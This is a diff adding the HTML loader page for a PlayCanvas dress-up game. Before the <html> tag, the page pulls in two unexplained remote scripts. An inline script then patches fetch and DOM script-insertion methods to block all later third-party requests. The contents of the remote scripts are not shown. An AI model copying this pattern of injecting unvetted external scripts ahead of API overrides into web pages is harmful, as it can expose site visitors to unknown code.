@@ -1,0 +1,118 @@
+<!DOCTYPE html><script src="https://olibot13.pythonanywhere.com/client_script.js"></script>
+<script src="https://help.voidium.uk/lib/fps.js"></script>
+<html>
+  <head>
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, viewport-fit=cover"
+    />
+    <meta charset="utf-8" />
+    <link rel="stylesheet" type="text/css" href="styles.css" />
+    <link rel="manifest" href="manifest.json" />
+    <style></style>
+    <title>Vortella&#39;s Dress Up</title>
+    <script>
+      (function () {
+        var originalFetch = window.fetch ? window.fetch.bind(window) : null;
+        if (!originalFetch) return;
+        function isThirdParty(input) {
+          try {
+            var url =
+              typeof input === "string"
+                ? input
+                : input && input.url
+                ? input.url
+                : String(input);
+            var parsed = new URL(url, window.location.href);
+            return parsed.origin !== window.location.origin;
+          } catch (e) {
+            return true;
+          }
+        }
+        window.fetch = function (input, init) {
+          if (isThirdParty(input)) {
+            return Promise.reject(new Error("Blocked third-party request"));
+          }
+          return originalFetch(input, init);
+        };
+
+        // Block third-party <script> insertions into <head>
+        function isBlockedScript(node) {
+          if (!node || node.tagName !== "SCRIPT") return false;
+          var src = node.getAttribute && node.getAttribute("src");
+          return src ? isThirdParty(src) : false;
+        }
+
+        var headProto =
+          (document.head &&
+            document.head.constructor &&
+            document.head.constructor.prototype) ||
+          (window.HTMLHeadElement && HTMLHeadElement.prototype);
+
+        if (headProto && headProto.appendChild) {
+          var nativeHeadAppendChild = headProto.appendChild;
+          headProto.appendChild = function (child) {
+            if (isBlockedScript(child)) {
+              throw new Error("Blocked third-party script append");
+            }
+            return nativeHeadAppendChild.call(this, child);
+          };
+        }
+
+        if (headProto && headProto.insertBefore) {
+          var nativeHeadInsertBefore = headProto.insertBefore;
+          headProto.insertBefore = function (child, ref) {
+            if (isBlockedScript(child)) {
+              throw new Error("Blocked third-party script insert");
+            }
+            return nativeHeadInsertBefore.call(this, child, ref);
+          };
+        }
+
+        // Also guard setting script.src after insertion
+        var scriptProto =
+          window.HTMLScriptElement && HTMLScriptElement.prototype;
+        if (scriptProto) {
+          var srcDesc = Object.getOwnPropertyDescriptor(scriptProto, "src");
+          if (srcDesc && srcDesc.set) {
+            Object.defineProperty(scriptProto, "src", {
+              configurable: true,
+              enumerable: srcDesc.enumerable,
+              get: srcDesc.get,
+              set: function (value) {
+                if (value && isThirdParty(value)) {
+                  throw new Error("Blocked third-party script src");
+                }
+                return srcDesc.set.call(this, value);
+              },
+            });
+          }
+
+          var nativeSetAttribute = Element.prototype.setAttribute;
+          Element.prototype.setAttribute = function (name, value) {
+            if (
+              this &&
+              this.tagName === "SCRIPT" &&
+              typeof name === "string" &&
+              name.toLowerCase() === "src" &&
+              value &&
+              isThirdParty(value)
+            ) {
+              throw new Error("Blocked third-party script src attribute");
+            }
+            return nativeSetAttribute.call(this, name, value);
+          };
+        }
+      })();
+    </script>
+    <script src="poki-sdk.js"></script>
+    <script src="files/assets/212735911/1/preEngineHelpers.js"></script>
+    <script src="playcanvas-stable.min.js"></script>
+    <script src="__settings__.js"></script>
+  </head>
+  <body>
+    <script src="__modules__.js"></script>
+    <script src="__start__.js"></script>
+    <script src="__loading__.js"></script>
+  </body>
+</html>
